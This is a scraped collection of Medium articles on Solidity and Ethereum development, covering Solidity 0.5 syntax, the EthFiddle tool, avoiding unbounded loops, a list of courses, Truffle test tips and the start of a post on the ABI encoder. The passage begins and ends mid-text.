semi-colon below this require statement?: This is where the function we are modifying is executed. We are essentially saying: I want this token\u2019s status to be available before I execute transferFrom.We can attach multiple modifiers to a function to check a range of conditions. Modifiers keep our code clean and adhering to DRY (Don\u2019t Repeat Yourself) principles. Cutting down code will also save gas fees upon deployment.//External Functionsfunction mint(address calldata _to, uint _amount)   external  payable {     ...     //call the internal minting function    _mint(_to, _amount);}External functions can now be defined. As we mentioned earlier on, external functions can be called from other contracts and public addresses. In the above example we define a mint() function. mint() handles the arguments needed to mint a token. It is payable and receives ETH in order to do so. Once the conditions are verified, mint() then calls an internal function, _mint(), in order to carry out the actual minting.Why would we have multiple mint()\u2019s consiting of internal and external functions? Well, I may wish to mint tokens in different ways.A mint(address _to) function could accept one recipient, whereas a mintMultiple(address[] _to) would accept an array of addresses, which would be looped through, but still utilise the same internal _mint() function to do the actual minting to the addresses.//Internal Functionsfunction _mint(address[] calldata _to, uint _amount)   internal {     ...     //call the internal minting function    _mint(_to, _amount);    emit TokenMinted(_to, _amount);}And finally, internal functions can be defined within our smart contracts. An emit statement is also included here, showing that an Event can be emitted within a function.Commenting syntaxBefore wrapping up this talk on Solidity 0.5, it is worth mentioning commenting syntax that the Solidity compiler can also pick up and warn you about in the event your comments are not adhering to the expected conventions.Take the following example from the ERC721 basic token transferFrom() method:/**  * @dev Throws unless `msg.sender` is the current owner, an authorized operator, or the approved  * address for this NFT. Throws if `_from` is not the current owner. Throws if `_to` is the zero  * address. Throws if `_tokenId` is not a valid NFT. This function can be changed to payable.  * @notice The caller is responsible to confirm that `_to` is capable of receiving NFTs or else  * they maybe be permanently lost.  * @param _from The current owner of the NFT.  * @param _to The new owner.  * @param _tokenId The NFT to transfer.  */function transferFrom(    address _from,    address _to,    uint256 _tokenId)...Notice the following conventions here:@dev is used to signify a comment for developers of the contract@notice is used to signify important warnings about function usage@param is used to outline each argument of a function. If we document an argument that does not exist, the Solidity compiler will warn us about this.@return is used to document the return type of the function. The above function does not return anything, therefore @return is not used.Where to go\u00a0Next?I hope this article has given you enough to whet your appetite for writing Solidity contracts.The official Solidity documentation does indeed go into the details and underlying workings of the language in a far greater depth than this article. Even though the examples are out of date it is a valuable, free resource for delving into Ethereum smart contract development.After reading this article familiarising yourself with the documentation should be more of a breeze, starting with the introduction:Introduction to Smart Contracts\u200a\u2014\u200aSolidity 0.5.3 documentationA contract in the sense of Solidity is a collection of code (its functions) and data (its state) that resides at a\u2026solidity.readthedocs.io", "responses": ""}, {"title": "EthFiddle.com: Share Your Solidity Code Snippets in\u00a0Seconds", "author_name": "James Martin Duffy", "link": "https://medium.com/loom-network/ethfiddle-com-share-your-solidity-code-snippets-in-seconds-1a006e09eaad?source=search_post", "post_date": "Nov 14, 2017", "readtime": "2 min read", "upvotes": "386", "content": "EthFiddle.com: Share Your Solidity Code Snippets in\u00a0SecondsJames Martin DuffyBlockedUnblockFollowFollowingNov 14, 2017For developers getting started in Solidity, you\u2019ll find the ecosystem doesn\u2019t yet have all the tools and services we\u2019ve grown accustomed to using with other programming languages.Here at Loom Network, we found ourselves wishing we had something like Go Playground or JSFiddle for Solidity\u200a\u2014\u200asome way to quickly share our code snippets with each other on Slack, or with others on sites like StackOverflow. So we decided to build one.Announcing EthFiddle.com: Share your Solidity code snippets in seconds.Easily compile, debug, and share your smart contracts in the\u00a0browser.EthFiddle lets you compile your Solidity code directly in the browser, so you can quickly test & debug smart contract code, and share a permalink to your code in a click.Feel free to use it, share it, and give us feedback to let us know what you think!We\u2019ll be adding some features over the coming weeks, as well as releasing a couple other tools that will make it easier for developers to learn, build, and deploy Solidity DApps.Update:\u00a0Did you know? We publicly released the Loom SDK beta in June, 2018. See the announcement here.", "responses": "3"}, {"title": "Getting Loopy with\u00a0Solidity", "author_name": "Rob Hitchens", "link": "https://blog.b9lab.com/getting-loopy-with-solidity-1d51794622ad?source=search_post", "post_date": "Oct 16, 2018", "readtime": "9 min read", "upvotes": "393", "content": "Getting Loopy with\u00a0SolidityHow to Avoid Unbounded \u201cFor\u201d Loops in Solidity Smart ContractsRob HitchensBlockedUnblockFollowFollowingOct 16, 2018Let\u2019s begin with a few questions:What is an unbounded for loop?Why is it an anti-pattern?How to avoid it?Image credit: Tine\u00a0Ivani\u010dAn unbounded for loop is any loop that has no constraint on the number of iterations. In other words, cases where there is no obvious limit.For example:\u201cfor every user, do something\u00a0\u2026\u201d when there is no apparent limit on the number of users.\u201cfor every item, do something\u00a0\u2026\u201d when there is no apparent limit on the number of items.for(i=0; i<?; i++) { // danger ahead }It\u2019s familiar-looking and deadly. In Solidity, we need to avoid that because it won\u2019t scale. Suppose it read \u201cFor i equals 0 to unmitigated disaster.\u201dNone of us sets out to build software that will lock up and fail after too many people use it. At least not on purpose, because we are nice people.Why won\u2019t it\u00a0scale?Because gas and gasLimit.\u201cgas\u201d is the unit of account for computational work used to pass on the cost of every transaction to the user. More work equals more gas which costs more to execute. Imagine your CPU sent you a bill for every single operation. Imagine no more!This is the reality of the Ethereum Virtual Machine. Someone always pays. You don\u2019t need to memorize the whole price list, but newcomers should internalize the idea that there is always a full accounting of everything that happens and nothing is ever free. See OPCODE Gas Costs (not perfectly up-to-date, but there\u2019s a handy link to the Yellow Paper in there).\u201cblock.gasLimit\u201d is a network property voted on by the miners. As developers, we don\u2019t control the gas limit, but we know it exists. You can think of it as the size of the fuel tank. If a transaction runs out of gas then the transaction will revert. We can\u2019t (currently) run a transaction that exceeds the block.gasLimit.The block.gasLimit is an evolving property of the Ethereum network. (Image credit: ethstats.net)Imagine you and your users are in an airplane. The further you want to go, the more gas you will burn. There is a maximum limit to the fuel you can carry and therefore a maximum distance you can fly. If you aim too far away, you will run out of gas before you get there and then bad things will happen\u00a0...The gasLimit adjusts over time (the miners vote on it) so you can never be too sure how much is too much, but you can be certain that there is a hard stop when you reach that point. You need to plan your journeys so you complete each step before that happens.You can safely do as many short hops as you want, refueling at each stop. Doesn\u2019t it make sense to think in terms of multiple, small, safe hops instead of depending on big risky moves?So, if you are thinking about any process in terms of for every customer, or for every item, you are probably overlooking the limits of your machine. You are probably thinking about the wrong solution to the problem. This sort of thing isn\u2019t an error in a particular line of code. It\u2019s a misguided approach.TL;DREvery step costs money. Some processes are more expensive than money can buy. This necessitates a new focus on efficiency.In Ethereum, unlimited work is not an option. This means some your favorite \u201cgo-to\u201d patterns and the obvious solutions to many everyday tasks are precisely what we must not do.Examples to avoid:Search for a record of interest in a list of unlimited size.Search for an insertion point in an ordered list of unlimited sizeRead or write too many items in a list of unlimited size.Reorganize list items in a big way such as a sort, roll up or splice.Recursively call contract functions with unlimited depth.How can we avoid getting\u00a0loopy?There are plenty of reasons to want to iterate over n instances of something. Finding ways around such tendencies calls for new ways of thinking.Let\u2019s look at a few examples.Avoid Sortsfor(i=0; I < records.length-1; i++) { for(j=i+1; j < records.length; j++) {  // compare record[i] and record[j]  // swap records if needed }}The classic bubble sort algo gets the job done if you have unlimited compute resources or a very small list. But we don\u2019t have unlimited resources and we must not approach problems this way. How on earth can we accomplish such a thing without using loops?This may seem hard to accept, but the first thing to do is to look for ways to avoid sorting anything. That\u2019s why you so seldom see professionally-crafted contracts doing sorts. Here\u2019s why and how: The Joy of MinimalismRely on 1-step\u00a0lookupsOne of the reasons we like to sort data is to find things efficiently, right? What if we could find any record in exactly one operation and also enumerate the complete list of everything stored? Would it still be vital to sort the data?Have a look over here for a popular pattern that does it all with unordered lists: Solidity CRUD.Ordered lists make it\u00a0worseIt\u2019s hard to beat 1-step look-ups. Ordered lists are much more work and often unnecessary, which is why we look for ways to avoid them.In that rare case that contract logic depends on an ordered list, then you must be extra cautious to ensure that there is always a way to contain the cost so you can guarantee that cost will be scale-invariant. To the author\u2019s knowledge, there is no known algorithm that can index or sort a list of unordered data without increasing the cost by some factor of scale. For example, O(log n).A solution to this problem is to break the mission down into smaller steps that the contract can complete at a fixed cost. This will likely involve externalizing some concerns, meaning, more reliance on outside help than seems obvious.Use HintsFor example, clients can send hints to contract functions.In the linked experimental pattern, the contract maintains an ordered list of everything thrown at it. Clients tell the contract what they want to insert and also give the contract hint about where to put it. The contract checks the acceptability of the request because the contract assures system integrity: LinkedList (with hints)Not so fast.Consider the following:Even if a client diligently searches and presents perfect hints, the situation may change before a transaction is mined, which means the hint may not be perfect anymore. If the contract disagrees with the hint about where to put something rather than rejecting the request outright, the contract conducts a regional search to find the right location, starting from the hint. If the correct spot can be located before it runs out of gas, then the insertion succeeds.It will always be possible to use the contract and always at a scale-invariant cost. A bulls-eye (perfectly accurate hint) is the same cost at any scale. There are similarly predictable costs for missing by 1, missing by 2, etc., which is what we want. It\u2019s not even vital that the hint is any good at all but the more the lazy software client misses, the higher the cost to the client.If the author\u2019s reasoning on this is correct, the worst-case scenario is so much data pouring into the contract that careful clients still miss by a lot because the contract state changes significantly before transactions are mined. Client costs are roughly overhead + O(missed by), so miserly clients slow down until there is less contention. The contract doesn\u2019t fail in any case and life goes on at any scale. That\u2019s the top priority.The above is certainly not the only approach. Apart from dispensing with the ordered list concern entirely, which we should do if we can, the point of the example is the vital importance of finding a solution that doesn\u2019t imply increasing cost or limits to scale.Queries and Filtered\u00a0ListsQueries are often cited as a justification for iterative processes. A developer might say something like \u201cI need to return a list of all the\u00a0\u2026\u201d.At the risk of seeming pedantic, \u201cI need\u201d seems to get the discussion off on the wrong foot. The developer is not normally a participant in the system architecture, so how can the non-participant have a need? This is not a good description of actual requirements. Perhaps someone has a need, but it\u2019s not the developer. Who? Why? Let\u2019s think carefully about that.There\u2019s a user interface, perhaps one or more servers, and a system of contracts. Let\u2019s say some component in the system will produce a list because a client needs it a certain way. Fair enough, but it\u2019s not necessarily the contract\u2019s job to do that and we shouldn\u2019t assume that it is. Using the contract for this purpose should be avoided where possible, and it\u2019s almost always possible: see The Joy of Minimalism in Smart Contract Design.What about returning arrays?The author has very mixed feelings about the trend toward increasing support of strings, dynamic arrays and structs in the ABI. Admittedly, pioneers learned to get by with fixed-size interfaces, so now we know patterns to follow. That makes the dynamic stuff seem far less vital than it might seem to newcomers who are accustomed to object-oriented languages.The discomfort is not merely about clinging to idiomatic patterns that have worked well for a considerable amount of time. The real source of the author\u2019s hesitation is that it seems to encourage rather than discourage unscaleable patterns and it seems to encourage complexity in a setting where we should be striving for simplicity itself.If we\u2019re sure that the largest possible array and the process that assembles it and sends it will always complete at a cost below the block.gasLimit, then it\u2019s technically feasible. The challenge is being sure. Given that (probably) no amendment of the contract will be possible, what is plan B in the case that the list-wise function becomes too expensive to be feasible or stops working entirely?Amortisation of\u00a0WorkA solution to that problem that provides maximum certainty is a more granular function that returns one item or one part of the solution at a time.Consider this:Software clients are not constrained by how many separate calls they make to a contract but each contract transaction and call is severely constrained by the maximum allowable computational complexity. So, we should work with patterns that move consumption from the resource that\u2019s scarce to the resource we have in abundance. Too abstract? It\u2019s better to have a software client make 1000 tiny contract function invocations to complete 1000 steps, instead of a contract function that repeats a step 1000 times.Nick Johnson calls this \u201cAmortisation of Work\u201d.Wait. What about race conditions?Good! Now we\u2019re thinking about implementation details. We can\u2019t leave half-baked contract states out there. Each atomic operation has to leave the contract in an acceptable state. This isn\u2019t necessarily easy, but it\u2019s the right difficult problem to work on.In summary, take any process that adds up to a variable amount of work and possibly a lot of work inside the contract, and turn it into a lot of small fixed-cost operations directed by the client side. When you do that, you will often find there is no longer a need for the big list-wise operation originally contemplated. Some readers may recognize that seems a lot like the concept of inverting control.Amortisation of work is a very useful\u00a0patternWant to get all the rows from an array? Feed them to clients one row at a time. Instead of the client requesting the list, the client will request one item at a time.Want to send all the users a dividend? Compute their entitlement (once) and wait for clients to claim them individually. This has the added benefit of externalising the cost of the distribution.Want to sort or filter an array? Leave that to the \u201csoftware client\u201d which could be a caching server as is the case with exchanges and explorers like etherscan.io. You didn\u2019t think they inspect the blockchain for every web request, did you? Of course not. They know better. Blocks arrive, things have happened, the off-chain high-performance database is updated because such things are designed to deal with ordering, filtering, joining and so on. This is also why you can see things on block explorers that are simply not there when you explore raw block data.As Nick Johnson puts it:Any loop like the one in the snippet above should set your spidey-sense tingling, and the first thing you should look for is a way to amortise the work being done.And that\u2019s what this post is all about.It\u2019s hard to accept (and even harder to adjust to) the need to amortise work. Doing so will affect the way you imagine architecture and control flows, the functions and the way you structure storage.At B9lab, we are dedicated to guiding students to the top of this field. Our hands-on training programs mentored by instructors like myself and workshops prepare students for stringent certification exams.Start with your Ethereum Developer Certification and consider branching out to Quorum Specialist (think \u201centerprise\u201d) or Quality Assurance Specialist (think \u201csmart contract auditor\u201d). Maybe even check out Hyperledger, Corda and EOS. They too are interesting and different.", "responses": ""}, {"title": "Top Tutorials To Learn Ethereum & Solidity at Different Level", "author_name": "Quick Code", "link": "https://medium.com/quick-code/top-tutorials-to-learn-ethereum-solidity-at-different-level-23700a04ae80?source=search_post", "post_date": "May 9, 2018", "readtime": "11 min read", "upvotes": "146", "content": "Top Tutorials To Learn Ethereum & Solidity at Different LevelQuick CodeBlockedUnblockFollowFollowingMay 9, 2018The digital cryptocurrency Bitcoin was the first Blockchain application. Success of Bitcoin led to the creation of the Ethereum platform. Whereas Bitcoin is a \u201cBlockchain Application\u201d, Ethereum is a \u201cBlockchain Platform\u201d. Ethereum not only supports a distributed ledger but it also supports Smart Contracts.Smart Contracts are computer programs that has the code that implements contractual agreements (rules) between two or more parties. The rules coded in the smart contract are triggered by events in the physical world and automatically carry out some predefined action(s). All of this happens without any intermediary, web servers or back end databases.Let me give you an example\u200a\u2014\u200aEbay is the intermediary between the buyer and seller. EBay makes $ every time a buyer buys an item from the seller. In a decentralized bidding application a smart contract can replace EBay the intermediary. The rule coded in the contract will be that when buyer will pay, the seller will ship the item to the buyer. The funds will be held in the smart contract till buyer confirms the receiving of the goods. Once the buyer confirms the receipt of goods the funds will be released to the seller. Smart Contracts are executed on the Ethereum network nodes as opposed to a centralized server infrastructure owned by an intermediary (e.g., Ebay). Nodes are Ethereum client processes running on the network participant\u2019s computer.Anyone can write Ethereum decentralized application, so in other words you can create your own Bitcoin like Cryptocurrency or Ebay like application on a public Ethereum network. Please note that all applications are not a good candidate for Blockchain technology for example building a static website on Blockchain technology is not the right use of the technology.Solidity is a programming language for writing Smart Contracts. Essentially, think of it as a way to control a bank account with code. With Solidity, we can write applications that simulate a crowd funding campaign, a lottery, a loan, or any other type of financial instrument. Don\u2019t be intimidated by learning \u2018another\u2019 programming language; Solidity is known to be quite similar to Javascript and exceptionally easy to pick up for anyone who has previous JS experience. This course will give you all the tools you need to master Solidity.Follow the best solidity courses series to see the most updated and top-rated tutorials and courses on solidity based on rating and reviews and quality.1. Solidity programming for beginners\u200a\u2014\u200acryptocurrency ethereumHow to create your own smart contracts and ICO token.Cryptocurrencies are currently a really hot topic. Bitcoin, Ethereum, Ripple, IOTA, EOS, Stellar, Cardano, NEO, Monero, RaiBlocks.Most people only have an Investment view. The real interesting thing however is the technology behind that\u200a\u2014\u200athe blockchain.While Bitcoin is limited to pay for services other cryptocurrencies try to address different problems. One of the most interesting cryptos is ethereum (ETH).This course is meant for beginners with one specific goal. Students who are interested in how to program an ethereum smart contract in solidity will get the chance to learn the fundamentals required to do that. Together we will learn and apply the solidity syntax. At the end we will program an ICO (inital coin offering).Finally you will be able to decide for yourself whether this topic excites you and whether you want to dive deeper into it.Before we start please note that this course is not about explaining what a cryptocurrency is. This is a programming course so we immediately start with the coding basics you need.2. Compile Your First Ethereum Smart Contract With\u00a0SolidityLearn how to set up your own private blockchain node using Geth, Solidity, and Mist.I will walk you through how to compile and run your first smart contract on a local test environment.This will includeInstalling Solidity, which used used to compile the contract into byte code that can be deployed on the blockchain.Installing Geth, which runs a local node and also has a JavaScript command line that can be used to talk to the blockchain.Create a private local node, so you can experiment without spending money.Create a couple of test accountsDeploy the smart contract into the test blockchainCall the functions of our smart contract to see that it is working.We do not cover:Solidity programming in depth, only show how to set up environment, compile and interact with contract.Workflow and IDE\u2019s for programming3. Ethereum Game Development: Build A Game On The BlockchainWork With Solidity & Other Tools, To Build A Fun Game! Gaining Greater Proficiency In Ethereum Blockchain Development.In this Ethereum Game Development Course, we\u2019re going to help you alleviate all of those questions you have around building something practical, upon the Ethereum Blockchain.We\u2019re going to help you build a Tic-Tac-Toe Game upon the Ethereum Blockchain, so you can become a more proficient Ethereum Blockchain Developer. Following which, you\u2019ll have worked with the Ethereum Blockchain at a more advanced level.That\u2019s the pure and simple goal, but, that entails covering every element of the Ethereum Blockchain Development journey, which we\u2019re sure you\u2019re going to find fascinating.4. Learn Solidity: Programming Language for Smart ContractsBest Solidity Tutorial Available Online to Build Blockchain Based Decentralized Application DApps on Ethereum Network.Solidity is a programming language for writing smart contracts which run on Ethereum Virtual Machine on Blockchain. It is a contract-oriented, high-level language whose syntax is similar to that of JavaScript and it is designed to target the Ethereum Virtual Machine.In this course you will learn everything related to Solidity to build Smart Contracts based Blockchain application on Ethereum.What is Ethereum, Smart Contracts & Blockchain?What is Solidity & Ethereum Virtual Machine?How to install & Setup Solidity Development Environment?How to write first basic smart contracts?Data types, control structure, functions, inheritance, mathematical operations, etc.How to deploy & test smart contracts in Solidity?Building 2 ApplicationsVoting Ballot on BlockchainFundRaiser ApplicationThis course will enable you to build any kind of Blockchain application on Ethereum using Solidity which is most common language for writing Ethereum Blockchain.5. Ethereum Developer Masterclass: Build Real World\u00a0ProjectsStep-By-Step: Real-World dApps On The Blockchain Using Latest Solidity, Web3js, Truffle, TestRPC and MetaMask.Ethereum Developer Masterclass: Build Real World Projects\u200a\u2014\u200ais the most complete Ethereum Blockchain Development course online helping you to build complex, real world, ethereum based distributed applications using solidity successfully.This course is perfect for anyone who wants to start there journey with the Blockchain, Solidity, and Ethereum whilst building something large and meaningful. Those who have an interest in advanced coding, including proven workflows and techniques will thoroughly enjoy this course.1. In this course we\u2019ll be detailing every aspect of the Ethereum Blockchain Development Ecosystem with you at an advanced level, enabling you to go forth to build complex Decentralised Applications using Solidity.2. Within this course we\u2019ll be guiding you through the process to create and launch your own Initial Coin Offering upon Ethereum, you\u2019ll then understand how it works on a technical level.3. By taking and completing this course we\u2019ll guide you through the steps to help you successfully build your very own completely decentralized exchange, and deploy it to Rinkeby-Testnet.6. Become a Blockchain Developer with Ethereum and\u00a0SolidityDevelop your first decentralized application from scratch on the Ethereum blockchain.This course is a complete introduction to decentralized application (Dapp) development on the Ethereum blockchain using the Solidity language and the Truffle build framework.No need to know anything about the blockchain, you should just have some basic software development experience. Whether you have already written some code for backend, web or mobile applications, it should be enough to become a blockchain developer thanks to this course.The blockchain is all the rage these days, and there is a lot of theoretical or anticipative talk around it, but this course will help you get your hands dirty with actual code in order to build your first decentralized application. This is the kind of skill that can get you an actual job as a blockchain developer, something that is in skyrocketing demand right now.Have you ever looked back on the nineties, thinking you would have loved to be a part of the web revolution. Well, stop dreaming: the blockchain is here and it promises to be even bigger than the web or even the mobile revolution.We briefly cover the philosophy of the blockchain, both as a crypto-currency system and as a development platformThen we will explain how blockchains work, what are their main components and how its ecosystem is structuredAfter that we quickly go over the main cryptographic tools you need to understandWe continue with a description of the perfect development environment, including tools that are used by most professional blockchain developersAnd the biggest part of the course is dedicated to guiding you through the iterative creation, development, testing and deployment of the ChainList decentralized applicationTools that you will come acrossEthereum of courseThe Metamask Chrome extensionThe Solidity smart contract languageThe Truffle build and test framework (Truffle 4)The Ganache Ethereum node emulatorGithub PagesAtom (text editor)The Rinkeby test network7. Ethereum\u00a0: Decentralized Application Design & DevelopmentDevelop a full DAPP | ICO | Setup Private netwrk in next 2 weeks using Web3J, TruffleV4, MetaMask, Ganache, Solidity +++.To build Ethereum Decentralized applications you will need to learn a couple of skills. This course can help you learn all of those skills but there are some prerequisites for the course:Experience with either Javascript or Java. Course will NOT teach JavascriptBasic understanding of the Javascript/HTML DOM modelAccess to a PC or MAC with access to the Internet (Minimum 4GB needed 6 GB preferred)Comfortable with new software installation & hands on codingThis course takes the approach of \u201cLearn by doing\u201d. Students are encouraged to try out all aspects of the technologies on their own after each lecture. Almost all of the concepts discussed in the lectures are shown in action by way code samples etc. The demo code used in the lectures is available for download from GitHub so that students can change the code to try out new things.Front end of the Decentralized applications are typically created as single page or desktop applications using Javascript/HTML/CSS. Since there are multiple Javascript frameworks, it was decided to keep the lectures independent of any specific JS framework. Students are free to use any one or more JS frameworks of their choice.Multiple quizzes in each section will validate student\u2019s knowledge. Coding exercises will help them understand the concepts better & gain confidence.Course is divided into 10 sections:Section#1Introduces the Blockchain & Ethereum technologySection#2Drills deeper into the Ethereum Blockchain technologyConcepts, WalletHands-on: Install Wallet, Mining for Ethers, TransactionsSection#3Ethereum ClientHands-on: Install Geth, Try out the geth commands & optionsSection#4 Geth Javascript Management APIHands-on: Try out the various API i console and by writing scriptsSection#5Web3 APIHands-on: Develop Javascript/HTML front end for executing contracts on TestNetSection#6Getting ready for Smart Contract developmentLearn about the various tools & frameworks used for developing smart contractHands-on: Installation\u00a0: Visual Studio, Truffle framework version 4.0, Ganache, Meta-MaskSection#7Solidity for smart contracts developmentLearn the concepts of Solidity languageHands-on: Code simple contracts in Solidity + write test cases for testingSection#8Solidity &Infrastructure patternsHands-on: Code smart contractsEnd to end application walkthroughHands-on: DIY Project & SolutionSection#9Covers the setting up of private networksTools for managing private networksSection#10All about Initial Coin Offering & ERC20 Standard for creating and launching a coinStudents will learn how to create a coin and manage it in common tools.8. Ethereum Blockchain Developer: Build Projects Using\u00a0SolidityOne Of The Largest, Most In-Depth Ethereum Blockchain Development Courses, Helping You To Build Projects Using Solidity.Ethereum Blockchain Developer: Build Projects Using Solidity\u200a\u2014\u200ais one of the largest, most in-depth ethereum development courses online. The curriculum contains a number of practical exercises, which will help you put all the knowledge you\u2019ve learned into practice to create something of value.By taking this course you\u2019ll get to work with the ethereum blockchain on a practical level, with step-by-step instructions guiding you through the entire process. This course embodies our ethos of learning by doing, as you\u2019ll have projects created of your very own by completing this course.1. We\u2019re in the early adopter stage with ethereum technology, so you currently have the chance to get in at the ground level and become proficient in it before it reaches the next adoption stage.2. Being apart of a community is crucial when it comes to new technology, and the ethereum communities are some of the most friendliest, hence you\u2019ll be able to communicate with them effectively having created projects of your very own in this course.3. There aren\u2019t many blockchain developers, yet there\u2019s huge demand! If you decide to continue to advance your journey in this field, you can be assured there are companies seeking your skills.9. Ethereum and Solidity: The Complete Developer\u2019s GuideUse Ethereum, Solidity, and Smart Contracts to build production-ready apps based on the blockchain.The development community is still figuring out the best way to use Ethereum in the creation of new and exciting apps. I spent a tremendous amount of time to research and create best practice for interfacing with Ethereum from Javascript. I can\u2019t overstate it enough; this course will show you the best and most easily repeatable patterns for creating production-ready apps with Ethereum.10. Create Ethereum & Blockchain Applications Using\u00a0SolidityLearn about everything there is to know about Ethereum and Blockchain Based Applications and How To Program Them. A step by step process is used to show explain every facet of these topics.Gain a good understanding of the following concepts with this course:What Solidity Is?How To Create Blockchain Applications?What Blockchain is?How Blockchain works?What is Bitcoin?What is Ethereum?Programming Blockchain ProgramsWhat are Cryptocurrencies?How Cryptocurrencies work?Alternative cryptocurrenciesCryptography basics11. Blockchain SpecializationThis specialization introduces blockchain, a revolutionary technology that enables peer-to-peer transfer of digital assets without any intermediaries, and is predicted to be just as impactful as the Internet. More specifically, it prepares learners to program on the Ethereum blockchain. The four courses provide learners with (i) an understanding and working knowledge of foundational blockchain concepts, (ii) a skill set for designing and implementing smart contracts, (iii) methods for developing decentralized applications on the blockchain, and (iv) information about the ongoing specific industry-wide blockchain frameworks.The specialization covers a range of essential topics, from the cryptographic underpinnings of blockchain technology to enabling decentralized applications on a private Ethereum blockchain platform.It is ideal for programmers and designers involved in developing and implementing blockchain applications, and anyone who is interested in understanding its potential.In this course you will learn\u00a0:Understand smart contracts, a core idea and computational model of blockchain that enables automation, autonomy, scalability and transparency.How to design and program smart contracts and decentralized application.Have an understanding and working knowledge of the emerging blockchain technology.How to think of innovative application models, leveraging the blockchain technology.", "responses": ""}, {"title": "Tips for Writing Solidity Tests with\u00a0Truffle", "author_name": "Matt Lockyer", "link": "https://medium.com/@mattdlockyer/tips-for-writing-solidity-tests-with-truffle-45cd278724b3?source=search_post", "post_date": "Aug 31, 2017", "readtime": "4 min read", "upvotes": "139", "content": "Tips for Writing Solidity Tests with\u00a0TruffleMatt LockyerBlockedUnblockFollowFollowingAug 31, 2017DCTRL VancouverAt first glance the Truffle Framework seems to be all setup for writing, deploying and testing contracts, and it\u2019s very well done. There are however some instances where you may want to augment Truffle with a few tips in order to streamline your test writing and running.I\u2019ll talk about 3 specific tips:Using `async` and `await` vs. promisesCreating a shared context for multiple testsEmbedding tests in other testsUsing these tips should help reduce a significant amount of code duplication in your tests and allow you to write more readable tests.Using `async` and `await` vs.\u00a0promisesTruffle comes with some tests out of the box and each test involves a lot of repeated boilerplate (which we\u2019ll talk about in 2) and uses promises.it(\"should call a function that depends on a linked library\", function() {    var meta;    var metaCoinBalance;    var metaCoinEthBalance;return MetaCoin.deployed().then(function(instance) {      meta = instance;      return meta.getBalance.call(accounts[0]);    }).then(function(outCoinBalance) {      metaCoinBalance = outCoinBalance.toNumber();      return meta.getBalanceInEth.call(accounts[0]);    }).then(function(outCoinBalanceEth) {      metaCoinEthBalance = outCoinBalanceEth.toNumber();    }).then(function() {      assert.equal(metaCoinEthBalance, 2 * metaCoinBalance,\"Library function returned unexpected function, linkage may be broken\");    });  });A bulk of the test is basic Promise \u201ccruft\u201d. Let\u2019s see what that test looks like rewritten with async and await.it(\"should call a function that depends on a linked library\", async function() {    var meta = await MetaCoin.deployed();    var metaCoinBalance = (await meta.getBalance.call(accounts[0])).toNumber();    var metaCoinEthBalance = (await meta.getBalanceInEth.call(accounts[0])).toNumber();assert.equal(metaCoinEthBalance, 2 * metaCoinBalance,\"Library function returned unexpected function, linkage may be broken\");  });Wow, what a difference!You can see that the savings comes from turning the test function itself into an async function and then having it await for each of the values it needs. Therefore, we don\u2019t need to write functions to handle each promise returned by the Truffle Contract instance meta of our contract MetaCoin.The other savings comes from being able to wrap the await response in brackets and convert directly from the object of type BigNumber into a JavaScript number using:(await meta.getBalance.call(accounts[0])).toNumber();Every uint256 returned from Solidity to JavaScript is an object of type BigNumber and can be converted to a number or string.Creating a shared context for multiple\u00a0testsAnother useful trick is creating a shared context of variables that you would like to use in multiple tests, across multiple contracts.The way Truffle is initially setup doesn\u2019t make this immediately obvious, and it took some Mocha digging to find the right approach.Here\u2019s how Truffle sets up a test out of the box:contract('MetaCoin', function(accounts) { ... tests ... }Now if you wanted to require this test in another test, it would be difficult. And how would you pass the same basket of variables (context) created inside this test to other tests, i.e. the \u201cshared context\u201d you\u2019re trying to achieve.Here\u2019s a slight modification on running a test that has an export, returns a context JSON object, all placed in a new file called shared.js:const run = exports.run = async(accounts) => {  const meta = await MetaCoin.deployed();  it(\"should have MetaCoin deployed\", () => {    assert(meta !== undefined, \"MetaCoin is deployed\");  });  return { meta }};contract('Shared', run);Now we have a nice test function that is async and returns a context object with our contract instance. It will await the deployed instance of our Truffle Contract and we can return the instance to be used inside our other contracts like so:const shared = require('./shared.js');contract('MetaCoinSale', (accounts) => {  let meta; //explained in a moment  it(\"should have the shared context\", async() => {    context = await shared.run(accounts);    meta = context.meta;    //or...    ({ meta, ... } = context);    //make sure not undefined    assert(meta !== undefined, 'has MetaCoin instance');  });... tests can use MetaCoin instance now ...});And there we have it. The first test in your actual contract test script will wait for the shared context to be returned, because we made the entire test runner function async.//shared.jsconst run = exports.run = async(accounts) => { ... }You can also declare several other variables in shared.js and return them using the context object. In your contract tests, simply use assignment (or destructuring to keep the lines of code minimal) for variables. Also to keep things convenient, I keep context variables scoped to the main test runner function so that all tests can access them. You\u2019re off to the races in minimizing your test code.Why declare variables like meta for the MetaCoin contract instance outside all your tests like this? It greatly simplifies each test you write, otherwise you would have to call:const meta = await MetaCoin.deployed();From inside each test case. Some might not like this, but the approach has been working out fine for me so far.Embedding tests in other\u00a0testsThis is essentially the same modification of decoupling the test runner function from the truffle contract call as in shared.js. For MetaCoin it looks something like this:const run = exports.run = (accounts) => {  ... MetaCoin tests ...};contract('MetaCoin', run);You would then use this in another contract like so:const metaTests = require('./metacoin.js');contract('MetaCoinSale', (accounts) => {  ...  metaTests.run(accounts);  ...});Note that an actual contract test runner is NOT async:const run = exports.run = (accounts) => {It will derail your whole shabang if it was\u2026 I\u2019m getting a bit tired writing this post but give it a shot making it async and watch it break\u00a0:)All your test can still be async like this though:const run = exports.run = (accounts) => {  it(\"should do some async magic\", async() => { ... }};contract('MetaCoin', run);And that\u2019s it! Those are my tips. Go forth, write small tiny tests and make some great, secure smart contracts.", "responses": "1"}, {"title": "The new Solidity ABI Encoder/Decoder and Optimizer", "author_name": "Christian", "link": "https://medium.com/@chriseth/the-new-solidity-abi-encoder-decoder-and-optimizer-aee8f91e2455?source=search_post", "post_date": "Dec 1, 2017", "readtime": "5 min read", "upvotes": "309", "content": "The new Solidity ABI Encoder/Decoder and OptimizerChristianBlockedUnblockFollowFollowingDec 1, 2017Original / updating version of this text: https://github.com/chriseth/notes/blob/gh-pages/articles/abi_iulia/abi_iulia.mdMotivationThe release notes of some of the previous Solidity releases kept on mentioning the new ABI encoder, which will enable you to use structs and arbitrarily nested arrays in function arguments and return values. Still, when people ask whether it can be finally used now, I have to politely decline and say it is not yet finished. The main reason why it takes a little longer is that we re-implemented it from scratch in a new programming language. In the following, I would like to explain the benefits of doing that and what the current progress is.The previous ABI encoder component of the Solidity compiler generated EVM assembly directly. This has several drawbacks: It is quite easy to introduce errors, it is very hard to check that it works correctly, it is difficult to maintain and finally, it is not so easy to write an optimizing compiler for this part.The following code is taken from the old ABI decoder:// first load from calldata and potentially convert to memory if arrayType is memoryTypePointer calldataType = 